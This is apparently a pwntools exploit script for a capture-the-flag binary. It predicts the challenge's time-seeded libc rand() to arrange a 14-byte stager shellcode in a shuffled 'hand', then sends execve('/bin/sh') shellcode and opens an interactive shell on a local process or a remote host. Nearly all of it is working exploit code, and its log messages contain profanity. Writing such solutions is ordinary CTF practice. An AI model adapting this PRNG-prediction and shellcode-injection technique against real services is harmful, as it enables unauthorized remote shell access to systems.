#!/bin/python3

from pwn import *
from ctypes import CDLL
import sys

libcx = CDLL("libc.so.6")
context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chall_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!
alloc_counter = 0
now = int(math.floor(time.time()))
libcx.srand(now)

gdbscript = '''
break *play+177
'''
def init():
    if (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
        pp.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        pp.sock.setblocking(False)

    else :
        pp = process(binary)# env=env)
        if (args.GDB):
            gdbx = gdb.attach(pp, gdbscript=gdbscript)

    return pp

def unpack_ptr(ptr):
    if (len(ptr) > 8):
        return u64(ptr[0:8])
    return u64(ptr + (b"\x00" * (8 - len(ptr)))  )

def swap(tidx):
    # pp.recvuntil(b"> ")
    pp.sendline(b"1")
    # pp.recvuntil(b": ")
    pp.sendline(str(tidx).encode())

def randx(shcode):
    for x in range(len(shcode)):
        while ((libcx.rand() & 0xff) != shcode[x]):
            swap(x)
            # log.info(f"fucking swapping on {x}")
        swap(x)
    

def exploit():
    # shuffling hand
    hands = 14
    hand = bytearray(b"\x00" * hands)
    i = 0
    while (i < hands):
        hand[i] = libcx.rand() & 0xff
        i+=1
    # shuffling hand

    sh = asm(
            "xor eax, eax;"
            "push rdi;"
            "pop rsi;"
            "push rax;"
            "pop rdi;"
            "add si, 0xe;"
            "push rsi;"
            "pop rdx;"
            "syscall;"
            )

    randx(sh)
    if (len(sh) > 14):
        log.error(f"go fuck yourself the sh is {len(sh)}")
    else :
        log.success(f"alright sh is {len(sh)}")


    pp.sendline(b"2")
    pp.recvuntil(b"D SCORE!")


    pp.sendline(asm(shellcraft.execve("/bin/sh", 0, 0)))

    pp.interactive()
        

if (args.REMOTE):
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)

pp = init()
exploit()
exit()
